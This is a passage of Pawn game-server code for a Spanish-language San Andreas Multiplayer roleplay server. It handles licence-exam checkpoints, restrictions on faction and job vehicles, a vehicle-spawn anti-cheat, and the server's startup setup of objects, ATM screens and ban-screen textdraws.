						case 7: SetPlayerRaceCheckpoint(playerid, 3, -1376.0507, 2448.2119, 147.9311, -1173.5979, 2656.2014, 134.9926, 6.0);
						case 8: SetPlayerRaceCheckpoint(playerid, 3, -1173.5979, 2656.2014, 134.9926, -866.8888, 2677.1228, 134.8802, 6.0);
						case 9: SetPlayerRaceCheckpoint(playerid, 3, -866.8888, 2677.1228, 134.8802, -583.7990, 2621.6641, 124.5950, 6.0);
						case 10: SetPlayerRaceCheckpoint(playerid, 3, -583.7990, 2621.6641, 124.5950, -368.7597, 2568.6921, 86.0015, 6.0);
						case 11: SetPlayerRaceCheckpoint(playerid, 3, -368.7597, 2568.6921, 86.0015, 87.2058, 2505.9927, 38.4314, 6.0);
						case 12: SetPlayerRaceCheckpoint(playerid, 3, 87.2058, 2505.9927, 38.4314, 383.6990, 2496.0896, 16.9575, 6.0);
						case 13: SetPlayerRaceCheckpoint(playerid, 1, 383.6990, 2496.0896, 16.9575, 0.0, 0.0, 0.0, 6.0);
						case 14:
						{		
							new string[126], vehicle = GetPlayerVehicleID(playerid), Float:vehvida;
							GetVehicleHealth(vehicle, vehvida);
							
							if(gettime() - entero[playerid][lictiempo] > 230 || vehvida <= 950)
							{
								Mensaje(playerid, COLOR_ROJO, "|____EXAMEN REPROBADO____|");
								
								format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
								Mensaje(playerid, COLOR_BLANCO, string);
								
								format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
								Mensaje(playerid, COLOR_BLANCO, string);
							}
							else
							{
								Mensaje(playerid, COLOR_VERDE, "|____EXAMEN APROBADO____|");
								
								format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
								Mensaje(playerid, COLOR_BLANCO, string);
								
								format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
								Mensaje(playerid, COLOR_BLANCO, string);
								
								cuenta[playerid][cLicenciaVuelo] = 1;
							}
							
							SetPosEx(playerid, 2048.1421, -1908.2161, 13.5469, 267.6207, 0, 0);
							terminarPrueba(playerid);
						}
					}
				}
				case 3:
				{
					enteroChar[licestado]{playerid}++;
					switch(enteroChar[licestado]{playerid})
					{
						case 1: SetPlayerRaceCheckpoint(playerid, 1, 70.4348, -1009.1017, -0.5573, 17.2706, -919.5793, -0.5883, 4.0);
						case 2: SetPlayerRaceCheckpoint(playerid, 1, 17.2706, -919.5793, -0.5883, -130.9745, -848.1539, -0.5852, 4.0);
						case 3: SetPlayerRaceCheckpoint(playerid, 1, -130.9745, -848.1539, -0.5852, -37.4063, -618.8232, -0.5545, 4.0);
						case 4: SetPlayerRaceCheckpoint(playerid, 1, -37.4063, -618.8232, -0.5545, 148.7364, -432.4186, -0.5063, 4.0);
						case 5: SetPlayerRaceCheckpoint(playerid, 1, 148.7364, -432.4186, -0.5063, 296.8453, -352.4254, -0.6798, 4.0);
						case 6: SetPlayerRaceCheckpoint(playerid, 1, 296.8453, -352.4254, -0.6798, 511.5570, -252.7190, -0.5767, 4.0);
						case 7: SetPlayerRaceCheckpoint(playerid, 1, 511.5570, -252.7190, -0.5767, 805.4914, -153.4740, -0.3605, 4.0);
						case 8: SetPlayerRaceCheckpoint(playerid, 1, 805.4914, -153.4740, -0.3605, 1047.1149, -115.0807, -0.4555, 4.0);
						case 9: SetPlayerRaceCheckpoint(playerid, 1, 1047.1149, -115.0807, -0.4555, 1250.5764, -180.8685, -0.5837, 4.0);
						case 10: SetPlayerRaceCheckpoint(playerid, 1, 1250.5764, -180.8685, -0.5837, 1439.6049, -246.8832, -0.6053, 4.0);
						case 11: SetPlayerRaceCheckpoint(playerid, 1, 1439.6049, -246.8832, -0.6053, 1599.5824, -92.3071, -0.5996, 4.0);
						case 12: SetPlayerRaceCheckpoint(playerid, 1, 1599.5824, -92.3071, -0.5996, 1762.1896, -26.1280, -0.5559, 4.0);
						case 13: SetPlayerRaceCheckpoint(playerid, 1, 1762.1896, -26.1280, -0.5559, 1897.7286, -79.6258, -0.6098, 4.0);
						case 14: SetPlayerRaceCheckpoint(playerid, 1, 1897.7286, -79.6258, -0.6098, 2110.3325, -107.5398, -0.5103, 4.0);
						case 15: SetPlayerRaceCheckpoint(playerid, 1, 2110.3325, -107.5398, -0.5103, 0.0, 0.0, 0.0, 4.0);
						case 16:
						{
							new string[126], vehicle = GetPlayerVehicleID(playerid), Float:vehvida;
							GetVehicleHealth(vehicle, vehvida);

							if(gettime() - entero[playerid][lictiempo] > 300 || vehvida <= 900)
							{
								Mensaje(playerid, COLOR_ROJO, "|____EXAMEN REPROBADO____|");
								
								format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
								Mensaje(playerid, COLOR_BLANCO, string);
								
								format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
								Mensaje(playerid, COLOR_BLANCO, string);
							}
							else
							{
								Mensaje(playerid, COLOR_VERDE, "|____EXAMEN APROBADO____|");
								
								format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
								Mensaje(playerid, COLOR_BLANCO, string);
								
								format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
								Mensaje(playerid, COLOR_BLANCO, string);
								
								cuenta[playerid][cLicenciaBote] = 1;
							}
							
							SetPosEx(playerid, 2048.1421, -1908.2161, 13.5469, 267.6207, 0, 0);
							terminarPrueba(playerid);
						}
					}
				}
			}
		}
	}
    return 1;
}
public OnPlayerStateChange(playerid, newstate, oldstate)
{	
	new newcar = GetPlayerVehicleID(playerid), string[128], engine, lights, alarm, doors, bonnet, boot, objective;
	//
	if(newstate == PLAYER_STATE_DRIVER)
	{
		AntiVehiculoTele[playerid] = newcar;
	} else {
		AntiVehiculoTele[playerid] = 0;
	}
	//AntiAutoSpawn
	if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_DRIVER)
	{
		gHackSpawn{playerid}++;
		switch(gHackSpawn{playerid})
		{
			case 1:
			{
				gHackSpawn2[playerid] = gettime() + 4;//2seg
			}
			case 3 .. 12:
			{
				if(gHackSpawn2[playerid] > gettime())
				{
					format(string, sizeof(string), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] fue baneado por HackSpawnAutos.", Nombre(playerid), playerid);
					MensajeAdmin(-1, string, 1);
					//
					new tmp15[24], tmp16[32];
					format(tmp16, sizeof(tmp16), "VH:%dS-VH:%dS", gHackSpawn2[playerid], gettime());
					format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
					ban(playerid, "Vehiculos-SpawnHack", tmp15, tmp16);
					return 1;
				}
				else
				{
					gHackSpawn2[playerid] = 0;
					gHackSpawn{playerid} = 0;
				}
			}
		}
	}
	else if(newstate==PLAYER_STATE_ONFOOT && oldstate==PLAYER_STATE_DRIVER)
	{
		//Trabajo de ladron	
		if(cuenta[playerid][cTrabajo] == 15 && cuenta[playerid][selecciono] == 2)
		{
			TextoInformatico(15, playerid, "~r~Usted ha fallado en robar el vehiculo");

			DisablePlayerCheckpoint(playerid);
			cuenta[playerid][cBusqueda] += 2;
			Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +2 nivel de busqueda por el robo fallido.");
			//ZZCASH
			switch(cuenta[playerid][cDonador])
			{
				case 1 .. 4: SetPlayerColor(playerid, 0xFFD70000);
				default: SetPlayerColor(playerid, 0xFFFFFF00);
			}

			cuenta[playerid][selecciono] = 0;
			cuenta[playerid][selecciono2] = 0;
		}
	}
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(newstate == PLAYER_STATE_DRIVER)
		{
			PlayerTextDrawShow(playerid, InfoText[playerid][11]);
			TextDrawShowForPlayer(playerid, TextdrawGlobal[0]);
		}
	}
	else
	{
		PlayerTextDrawHide(playerid, InfoText[playerid][11]);
		TextDrawHideForPlayer(playerid, TextdrawGlobal[0]);
	}
    if(oldstate == PLAYER_STATE_PASSENGER)
	{
    	if(DriveBy[playerid] || DriveBy[playerid] == 3)
		{
     		DriveBy[playerid] = false;
     		SetPlayerDrunkLevel(playerid, 0);
     	}
    }
	
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		booleano[MsgL4L]{playerid} = false;
		booleano[MensajeMuriendo]{playerid} = false;
		if(DrugFarming[playerid] > 0)
	 	{
	 	    DisablePlayerCheckpoint(playerid);
	 	    DrugFarming[playerid] = 0;
	 	    Mensaje(playerid, COLOR_BLANCO, "Dejaste de cosechar drogas!");
	 	}
	}
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		Mensaje(playerid, COLOR_BLANCO, "{9EC73D}» {FFFFFF}Para encender/apagar el vehículo, puedes presionar {9EC73D}'2'{FFFFFF} o utilizar el comando {9EC73D}[/motor]");
	}
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		for(new m = 0; m < sizeof(Motocicletas); m++)
		{
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == Motocicletas[m][0])
			{
				Mensaje(playerid, COLOR_BLANCO, "{9EC73D}» {FFFFFF}Recuerda colocarte el {9EC73D}/casco{FFFFFF}, caso contrario recibirás una multa.");
			}
		}
	}
	
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		for(new i=0, t=GetMaxPlayers(); i<t; i++)
		{
			if(!IsPlayerConnected(i))continue;
			if(IsPlayerConnected(i))
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 416)
				{
					if(GetPlayerVehicleSeat(playerid) >= 2)
					{
						LoadObjects(playerid);
						SetPosEx(playerid, 2003.3566, 2288.7163, 1011.1256, 0, 0, GetPlayerVehicleID(playerid));
						InAmbu[playerid] = GetPlayerVehicleID(playerid);
					}
				}
	        }
	    }
	}
	
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(!EsBicicleta(newcar))
		{
			if(!cuenta[playerid][cLicenciaAuto])
			{
				Mensaje(playerid, COLOR_BLANCO, "{AA3333}» {FFFFFF}No tienes {AA3333}Licencia de Manejo{FFFFFF}, ten mucho cuidado con los Policias!");
			}
		}
		// =================================Carros de Renta ==================================//
   		if(Hire_Vehicle(newcar))
		{
			if(HireKey[playerid] == 9999)
			{
				ShowPlayerDialog(playerid, DIA_RENTA, DIALOG_STYLE_INPUT, "Vehiculo de alquiler", "{ffffff}Por favor ingrese la cantidad de tiempo en minutos\n{ffffff}Que desea usar este vehiculo en el siguiente espacio:\n{ff0000} 1 minutos equivale a 3$\n{ff0000}PEjemplo: 10 = 10 Minutos", "Aceptar", "Cancelar");
			} else if(HireKey[playerid] != newcar) RemovePlayerFromVehicle(playerid), Mensaje(playerid, 0xFFFFFFFF, "Recuerda que tienes un vehículo alquilado. Utiliza /desrentarveh para poder alquilar otro.");
		}
		// ========================== Info Embargos & Multa ================================ //
		if(cuenta[playerid][cCoche] == newcar || cuenta[playerid][cCoche2] == newcar)
		{
			if(autos[newcar][cEmbargo] > 0 || autos[newcar][cMulta] > 0)
			{
			    Mensaje(playerid, COLOR_AMARILLO2, "-------------------------------------------");
			    format(string, sizeof(string), "  Embargos: %d <> Multa: %d$", autos[newcar][cEmbargo], autos[newcar][cMulta]);
			    Mensaje(playerid, COLOR_BLANCO, string);
			    Mensaje(playerid, COLOR_AMARILLO2, "-------------------------------------------");
				return 1;
			}
        }
        // ============================ Embargos ============================== //
       	if(EsComprable(newcar) && autos[newcar][cEmbargo] > 1)
		{
			Mensaje(playerid, COLOR_GRIS2, "Este vehículo esta embargado! No puede ser conducido.");
			RemovePlayerFromVehicle(playerid);
			return 1;
		}
        //============================[Decir dueño]==============================//
       	if(EsComprable(newcar) && autos[newcar][cOwned])	
		{
			new str[128];
			format(str, sizeof(str), "{9EC73D}» {FFFFFF}Vehiculo a nombre de: {9EC73D}%s", autos[newcar][cOwner]);
			Mensaje(playerid, COLOR_BLANCO, str);
			format(str, sizeof(str), "{AA3333}» {FFFFFF}El impuesto de este vehiculo expira en {AA3333}%s", ObtenerTiempoRestante(autos[newcar][cVehTime]));
			Mensaje(playerid, COLOR_BLANCO, str);
			return 1;
		}
  		// -================================ Carros de Facciones ================================- //
		else if(FBI_Vehicle(newcar))
  		{
  		    if(Team_FBI(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_GRIS2, "Este vehículo no es de tu facción!"); return 1;
		}
		else if(EsFortCarson(newcar))
  		{
  		    if(Team_Fort(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_GRIS2, "Este vehículo no es de tu facción!"); return 1;
		}
		else if(SAMD_Vehicle(newcar))
  		{
 		    if(Team_SAMUR(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_GRIS2, "Este vehículo no es de tu facción!");return 1;
		}
		else if(Gobierno_Vehicle(newcar))
  		{
  		    if(Gobierno(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_GRIS2, "Este vehículo no es de tu facción!");return 1;
		}
		else if(Mecanico_Vehicle(newcar))
  		{
  		    if(Team_Mecanicos(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este vehículo no es de tu facción.");return 1;
		}
		else if(CNN_Vehicle(newcar))
  		{
  		    if(EsPeriodista(playerid)){ return 1; }
  		    else RemovePlayerFromVehicle(playerid); Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este vehículo no es de tu facción.");return 1;
		}
		else if(EsBicicleta(newcar))
		{
		    GetVehicleParamsEx(newcar, engine, lights, alarm, doors, bonnet, boot, objective);
		    SetVehicleParamsEx(newcar, 1, lights, alarm, doors, bonnet, boot, objective);
		}
		
		if(EsComprable(newcar)) format(string, 16, "%s", autos[newcar][cName]);
		else format(string, 16, "%s", GetVehicleFriendlyName(newcar));
		GameTextForPlayer(playerid, string, 3000, 1);
	}
	
	for(new i=0; i<sizeof(Autosfacc); i++)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(Autosfacc[i][af@carid] == newcar && Autosfacc[i][af@faccion] != cuenta[playerid][cMiembro])
			{
				RemovePlayerFromVehicle(playerid); 
				Mensaje(playerid, COLOR_ROJO, "Este vehículo no es de tu facción!");
				return 1;
			}
		}
	}
		
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(cuenta[playerid][servicio])
		{
			if(transAuto(newcar) && cuenta[playerid][cTrabajo] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Transportador de Valores!");
			}		
			else if(aviadorAuto(newcar) && cuenta[playerid][cTrabajo] != 2)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Piloto!");
			}		
			else if(camioneroAuto(newcar) && cuenta[playerid][cTrabajo] != 3)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Camionero!");
			}		
			else if(barrenderoAuto(newcar) && cuenta[playerid][cTrabajo] != 4)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Barrendero!");
			} 
			else if(busesAuto(newcar) && cuenta[playerid][cTrabajo] != 5)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Chofer de Buses!");
			}	
			else if(agricultorAuto(newcar) && cuenta[playerid][cTrabajo] != 6)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Agricultor!");
			}
			else if(pizzaAuto(newcar) && cuenta[playerid][cTrabajo] != 7)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Pizzero!");
			}
			else if(tren == newcar && cuenta[playerid][cTrabajo] != 8)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Chofer de Trenes!");
				return 1;
			}
			else if(taxiAuto(newcar) && cuenta[playerid][cTrabajo] != 9)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Taxista!");
			}
			else if(basureroAuto(newcar) && cuenta[playerid][cTrabajo] != 10)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Basurero!");
			}
			else if(pescadorAuto(newcar) && cuenta[playerid][cTrabajo] != 11)
			{
				RemovePlayerFromVehicle(playerid);
				Mensaje(playerid, COLOR_ROJO, "Usted no es Pescador!");
			}
		}
		else if(!cuenta[playerid][servicio] && tren == newcar || transAuto(newcar) || aviadorAuto(newcar) || camioneroAuto(newcar) || barrenderoAuto(newcar) || busesAuto(newcar) || agricultorAuto(newcar) || pizzaAuto(newcar) || taxiAuto(newcar) || basureroAuto(newcar) || pescadorAuto(newcar))
		{
			RemovePlayerFromVehicle(playerid);
			Mensaje(playerid, COLOR_ROJO, "Usted debe estar en /servicio para usar este vehiculo.");
		}
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
    if(DriveBy[playerid] || DriveBy[playerid] == 3)
	{
  		DriveBy[playerid] = false;
  		SetPlayerDrunkLevel(playerid, 0);
    }
	if(booleano[gCinturon]{playerid})
	{
		new tmp[126];
		format(tmp, sizeof(tmp), "* %s se desabrocha el cinturón y baja del vehiculo.", PlayerName(playerid));
		ProxDetector(30.0, playerid, tmp, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		booleano[gCinturon]{playerid} = false;
	}
	if(booleano[NoFuel]{playerid}) TogglePlayerControllable(playerid, 1);
	booleano[NoFuel]{playerid} = false;
	TogglePlayerControllable(playerid, true);
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(!booleano[iConnect]{playerid})
	{
		booleano[iConnect]{playerid} = true;
		for(new i=0;i<100;i++)
		{
			Mensaje(playerid, -1, "");
		}
		SetPlayerPos(playerid, 1441.6356, -805.3043, 80.1063);//Posicion PJ para Inicio
		InterpolateCameraPos(playerid, 1900.364868, -1176.028564, 148.561599, 1501.008789, -836.907531, 81.709472, 10000);//Posicion Camara Intro
		InterpolateCameraLookAt(playerid, 1897.006713, -1172.379638, 147.922729, 1497.034790, -833.874694, 81.807121, 10000);//Posicion Camara Intro
		ConsultarCuenta(playerid);
	}
	return true;
}

public OnGameModeExit(){
	new year, month, day;
	getdate(year, month, day);
    printf("Gamemode ZonaZero Finalizado. [%d/%d/%d]", day, month, year);
	return 1;
}

public OnGameModeInit()
{
	AntiDeAMX();
	//Host, User, Base, Clave
	servidor[mysqlControl] = mysql_connect("127.0.0.1", "root", "samp1_db", "");
	if(!servidor[mysqlControl])SendRconCommand("exit");
	mysql_log(LOG_ERROR | LOG_WARNING);
	
	CargarMapeos();
	CargarCasas();
	Cargarfamilias();
	Cargarfacciones();
	CargarNegocios();
	CargarRejas();
	
    skinb = LoadModelSelectionMenu("bincos.txt");
	for(new x=0;x<sizeof(armasventa);x++)
	{
		CreateDynamic3DTextLabel("Presione ~k~~VEHICLE_ENTER_EXIT~\nPara visualizar el item.", 0xFFFFFF88, armasventa[x][av@Pos][0], armasventa[x][av@Pos][1], armasventa[x][av@Pos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, 7, -1);
		CreateDynamicObject(armasventa[x][av@object], armasventa[x][av@Pos][0], armasventa[x][av@Pos][1], armasventa[x][av@Pos][2], armasventa[x][av@Pos][3], armasventa[x][av@Pos][4], armasventa[x][av@Pos][5]);
	}
	for(new i=3; i<sizeof(trabMinero); i++)
	{
		CreateDynamic3DTextLabel("Mina\nPresiona ~k~~PED_FIREWEAPON~ para minar.", 0xE8E202FF, trabMinero[i][minPos][0], trabMinero[i][minPos][1], trabMinero[i][minPos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID);
	}	
	for(new i=1; i<sizeof(trabCarpintero); i++)
	{
		CreateDynamic3DTextLabel("Mesa\nPresiona ~k~~PED_FIREWEAPON~ para crear.", 0xE8E202FF, trabCarpintero[i][carPos][0], trabCarpintero[i][carPos][1], trabCarpintero[i][carPos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID);
	}
	for(new i=1; i<sizeof(trabObrero); i++)
	{
		CreateDynamic3DTextLabel("Construccion\nPresiona ~k~~PED_FIREWEAPON~ para construir.", 0xE8E202FF, trabObrero[i][obrPos][0], trabObrero[i][obrPos][1], trabObrero[i][obrPos][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID);
	}
	for(new i=0; i<sizeof(trabBasurero); i++)
	{
		trabBasurero[i][basObjeto] = CreateDynamicObject(trabBasurero[i][basOmodel], trabBasurero[i][basPosOb][0], trabBasurero[i][basPosOb][1], trabBasurero[i][basPosOb][2], trabBasurero[i][basPosOb][3], trabBasurero[i][basPosOb][4], trabBasurero[i][basPosOb][5]);
	}
	for(new i=0;i<MAX_ANUNCIOS;i++)
	{
		Publicidad[i][_pObjecto] = CreateObject(4729, Publicidad[i][_pPosx], Publicidad[i][_pPosy], Publicidad[i][_pPosz], 0.0000, 0.0000, Publicidad[i][_pPosrz], 1000.0);
		SetObjectMaterialText(Publicidad[i][_pObjecto], "Center Island RolePlay\n\n {FFFFFF}Publicidad Disponible", 0, 120, "impact", 32, 0, -32256, -16777216, 1);
	}
	for(new x=0; x<sizeof(textObjeto); x++)
	{
		textObjeto[x][tO@id] = CreateObject(textObjeto[x][tO@model], textObjeto[x][tO@pos][0], textObjeto[x][tO@pos][1], textObjeto[x][tO@pos][2], textObjeto[x][tO@rot][0], textObjeto[x][tO@rot][1], textObjeto[x][tO@rot][2]);
		SetObjectMaterialText(textObjeto[x][tO@id], textObjeto[x][tO@tmp], textObjeto[x][tO@mindex], textObjeto[x][tO@msize], textObjeto[x][tO@font], textObjeto[x][tO@fontsize], textObjeto[x][tO@bold], textObjeto[x][tO@fontcolor], textObjeto[x][tO@backcolor], textObjeto[x][tO@malig]);
	}
	for(new i=0, t=GetMaxPlayers(); i < t; i++)
	{
		estado[i] = Create3DTextLabel("void", -1, 30.0, 40.0, 5.0, 40.0, 1);
	}
	//
	TextdBan[0] = TextDrawCreate(102.000000, 179.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~");
	TextDrawBackgroundColor(TextdBan[0], 255);
	TextDrawFont(TextdBan[0], 1);
	TextDrawLetterSize(TextdBan[0], 0.569999, 0.599999);
	TextDrawColor(TextdBan[0], -1);
	TextDrawSetOutline(TextdBan[0], 0);
	TextDrawSetProportional(TextdBan[0], 1);
	TextDrawSetShadow(TextdBan[0], 1);
	TextDrawUseBox(TextdBan[0], 1);
	TextDrawBoxColor(TextdBan[0], 102);
	TextDrawTextSize(TextdBan[0], 564.000000, 0.000000);
	TextDrawSetSelectable(TextdBan[0], 0);

	TextdBan[1] = TextDrawCreate(325.000000, 180.000000, "usted ha sido expulsado(~r~Ban~w~)~n~~n~~n~~n~~n~~n~~n~~n~~n~usted fue expulsado permanentemente del servidor, si cree que es un mal entendido.~n~presione ~g~F8~w~ y haga una apelacion en el foro: ~b~foro.CenterIsland.com");
	TextDrawAlignment(TextdBan[1], 2);
	TextDrawBackgroundColor(TextdBan[1], 255);
	TextDrawFont(TextdBan[1], 2);
	TextDrawLetterSize(TextdBan[1], 0.220000, 1.200000);
	TextDrawColor(TextdBan[1], -1);
	TextDrawSetOutline(TextdBan[1], 0);
	TextDrawSetProportional(TextdBan[1], 1);
	TextDrawSetShadow(TextdBan[1], 1);
	TextDrawSetSelectable(TextdBan[1], 0);

	TextdBan[2] = TextDrawCreate(110.000000, 210.000000, "~y~Nombre: ~w~Cesar_Segura~n~~y~Nombre: ~w~Cesar_Segura~n~~y~Nombre: ~w~Cesar_Segura~n~~y~Nombre: ~w~Cesar_Segura");
	TextDrawBackgroundColor(TextdBan[2], 255);
	TextDrawFont(TextdBan[2], 1);
	TextDrawLetterSize(TextdBan[2], 0.300000, 1.500000);
	TextDrawColor(TextdBan[2], -65281);
	TextDrawSetOutline(TextdBan[2], 0);
	TextDrawSetProportional(TextdBan[2], 1);
	TextDrawSetShadow(TextdBan[2], 1);
	TextDrawSetSelectable(TextdBan[2], 0);
	//Cajeros - Sistema de Cajeros
	for(new i=0; i<sizeof cajeros; i++)
	{
		CreateDynamicObject(cajeros[i][cajeroObjeto], cajeros[i][cajeroPos][0], cajeros[i][cajeroPos][1], cajeros[i][cajeroPos][2], cajeros[i][cajeroPos][3], cajeros[i][cajeroPos][4], cajeros[i][cajeroPos][5]);

		cajeros[i][Textdcajero][0] = TextDrawCreate(720.00, -5.00, "New Textdraw");
		TextDrawBackgroundColor(cajeros[i][Textdcajero][0], 255);
		TextDrawFont(cajeros[i][Textdcajero][0], 1);
		TextDrawLetterSize(cajeros[i][Textdcajero][0], 0.50, 25.60);
		TextDrawColor(cajeros[i][Textdcajero][0], -1);
		TextDrawSetOutline(cajeros[i][Textdcajero][0], 0);
		TextDrawSetProportional(cajeros[i][Textdcajero][0], 1);
		TextDrawSetShadow(cajeros[i][Textdcajero][0], 1);
		TextDrawUseBox(cajeros[i][Textdcajero][0], 1);
		TextDrawBoxColor(cajeros[i][Textdcajero][0], 255);
		TextDrawTextSize(cajeros[i][Textdcajero][0], -30.00, 0.00);
		TextDrawSetSelectable(cajeros[i][Textdcajero][0], 0);
		
		cajeros[i][Textdcajero][1] = TextDrawCreate(720.00, 10.00, "New Textdraw");
		TextDrawBackgroundColor(cajeros[i][Textdcajero][1], 255);
		TextDrawFont(cajeros[i][Textdcajero][1], 1);
		TextDrawLetterSize(cajeros[i][Textdcajero][1], 0.50, 3.19);
		TextDrawColor(cajeros[i][Textdcajero][1], -1);
		TextDrawSetOutline(cajeros[i][Textdcajero][1], 0);
		TextDrawSetProportional(cajeros[i][Textdcajero][1], 1);
		TextDrawSetShadow(cajeros[i][Textdcajero][1], 1);
		TextDrawUseBox(cajeros[i][Textdcajero][1], 1);
		TextDrawBoxColor(cajeros[i][Textdcajero][1], 16711935);
		TextDrawTextSize(cajeros[i][Textdcajero][1], 0.00, 0.00);
		TextDrawSetSelectable(cajeros[i][Textdcajero][1], 0);

		cajeros[i][Textdcajero][2] = TextDrawCreate(720.00, 379.00, "New Textdraw");
		TextDrawBackgroundColor(cajeros[i][Textdcajero][2], 255);
		TextDrawFont(cajeros[i][Textdcajero][2], 1);
		TextDrawLetterSize(cajeros[i][Textdcajero][2], 0.50, 3.19);
		TextDrawColor(cajeros[i][Textdcajero][2], -1);
		TextDrawSetOutline(cajeros[i][Textdcajero][2], 0);
		TextDrawSetProportional(cajeros[i][Textdcajero][2], 1);
		TextDrawSetShadow(cajeros[i][Textdcajero][2], 1);
		TextDrawUseBox(cajeros[i][Textdcajero][2], 1);
		TextDrawBoxColor(cajeros[i][Textdcajero][2], 16711935);
		TextDrawTextSize(cajeros[i][Textdcajero][2], 0.00, 0.00);
		TextDrawSetSelectable(cajeros[i][Textdcajero][2], 0);
		
		cajeros[i][Textdcajero][3] = TextDrawCreate(151.00, 377.00, "cajero automatico~n~     banco de los santos");
		TextDrawBackgroundColor(cajeros[i][Textdcajero][3], 255);
		TextDrawFont(cajeros[i][Textdcajero][3], 2);
		TextDrawLetterSize(cajeros[i][Textdcajero][3], 0.59, 3.69);
		TextDrawColor(cajeros[i][Textdcajero][3], -1);
		TextDrawSetOutline(cajeros[i][Textdcajero][3], 0);
		TextDrawSetProportional(cajeros[i][Textdcajero][3], 1);
		TextDrawSetShadow(cajeros[i][Textdcajero][3], 1);
		TextDrawSetSelectable(cajeros[i][Textdcajero][3], 0);

		cajeros[i][Textdcajero][4] = TextDrawCreate(10.00, 158.00, "Nombre: Cesar_Segura~n~~n~NumTarjeta: 00000000");
		TextDrawBackgroundColor(cajeros[i][Textdcajero][4], 0);
		TextDrawFont(cajeros[i][Textdcajero][4], 2);
		TextDrawLetterSize(cajeros[i][Textdcajero][4], 0.21, 1.39);
		TextDrawColor(cajeros[i][Textdcajero][4], 255);
		TextDrawSetOutline(cajeros[i][Textdcajero][4], 0);
		TextDrawSetProportional(cajeros[i][Textdcajero][4], 1);
		TextDrawSetShadow(cajeros[i][Textdcajero][4], 1);
		TextDrawUseBox(cajeros[i][Textdcajero][4], 1);
		TextDrawBoxColor(cajeros[i][Textdcajero][4], -1);
		TextDrawTextSize(cajeros[i][Textdcajero][4], 153.00, 2.00);
		TextDrawSetSelectable(cajeros[i][Textdcajero][4], 0);

		for(new k=0; k<sizeof(textdOstring); k++)
		{
			cajeros[i][Textdcajero][5 + k] = TextDrawCreate(569.00, 139.00 + (k * 20), textdOstring[k]);
			TextDrawAlignment(cajeros[i][Textdcajero][5 + k], 2);
			TextDrawBackgroundColor(cajeros[i][Textdcajero][5 + k], 255);
			TextDrawFont(cajeros[i][Textdcajero][5 + k], 2);
			TextDrawLetterSize(cajeros[i][Textdcajero][5 + k], 0.37, 1.39);
			TextDrawColor(cajeros[i][Textdcajero][5 + k], -1);
			TextDrawSetOutline(cajeros[i][Textdcajero][5 + k], 0);
			TextDrawSetProportional(cajeros[i][Textdcajero][5 + k], 1);
			TextDrawSetShadow(cajeros[i][Textdcajero][5 + k], 1);
			TextDrawUseBox(cajeros[i][Textdcajero][5 + k], 1);
			TextDrawBoxColor(cajeros[i][Textdcajero][5 + k], 16711935);
			TextDrawTextSize(cajeros[i][Textdcajero][5 + k], 20.00, 130.00);
			TextDrawSetSelectable(cajeros[i][Textdcajero][5 + k], true);
		}
